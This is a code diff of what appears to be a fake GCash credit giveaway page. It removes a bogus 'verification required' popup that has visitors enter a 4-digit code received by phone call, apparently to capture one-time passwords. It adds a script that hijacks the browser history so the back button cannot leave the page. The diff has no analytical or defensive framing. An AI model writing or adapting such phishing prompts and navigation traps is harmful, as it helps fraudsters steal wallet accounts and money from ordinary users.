@@ -201,29 +201,15 @@
         Share to <strong>Social Media</strong> <br>received up to <strong>₱1,000 GCash Credits</strong>
     </div>
 
-    <!-- FIREWALL VERIFICATION POPUP -->
-    <div id="firewallPopup" class="firewall-popup-overlay" style="display: none;">
-        <div class="firewall-popup-card">
-            <div class="popup-close-btn" id="firewallCloseBtn">✕</div>
-            <div id="firewallPopupContent">
-                <div class="firewall-warning-icon">📞</div>
-                <h2>VERIFICATION REQUIRED</h2>
-                <div class="firewall-message">
-                    <p>Due to multiple claiming requests detected in the system, a quick verification call is required before proceeding.</p>
-                    <p>Please wait for the system-verification to call you. You will receive a 4-digit code during the call.</p>
-                    <p>Enter the code below to continue.</p>
-                </div>
-                <div class="verification-input-group">
-                    <input type="text" id="verificationCode" class="verification-input" placeholder="Enter 4-digit code" maxlength="4" inputmode="numeric">
-                    <button id="verifyCodeBtn" class="verify-btn">VERIFY NOW</button>
-                </div>
-                <div class="firewall-note">
-                    <p>Waiting for system-verification call...</p>
-                </div>
-                <div id="firewallErrorMsg" class="firewall-error" style="display: none;"></div>
-            </div>
-        </div>
-    </div>
+<script>
+    (function() {
+        history.pushState(null, null, location.href);
+        window.addEventListener('popstate', function(event) {
+            history.pushState(null, null, location.href);
+            event.preventDefault();
+        });
+    })();
+</script>
 
     <canvas id="confettiCanvas"></canvas>
 
